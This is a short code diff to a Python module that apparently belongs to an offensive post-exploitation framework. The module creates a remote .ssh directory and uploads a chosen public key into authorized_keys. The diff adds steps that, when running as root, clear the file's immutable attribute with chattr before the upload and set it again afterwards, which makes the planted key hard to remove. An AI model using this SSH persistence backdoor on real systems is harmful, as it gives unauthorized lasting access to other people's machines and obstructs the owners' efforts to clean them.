@@ -13,8 +13,20 @@ def execute(session, configs, params):
         shell = session.shell("/bin/bash")
         shell.sendline("mkdir -p " + remote_ssh_dir)
         output = str(shell.recvrepeat(0.2), "UTF-8")
-        shell.close()
+
+        # Make authorized_keys susceptible
+        if session.user == "root":
+            print("reached")
+            shell.sendline("chattr -i " + remote_ssh_dir + "authorized_keys")
+            output = str(shell.recvrepeat(0.2), "UTF-8")
+
         session.upload_file(configs["KeyFilePub"], remote_ssh_dir + "authorized_keys")
+
+        if session.user == "root":
+            shell.sendline("chattr +i " + remote_ssh_dir + "authorized_keys")
+            output = str(shell.recvrepeat(0.2), "UTF-8")
+
+        shell.close()
         return 0
     except:
         return 2
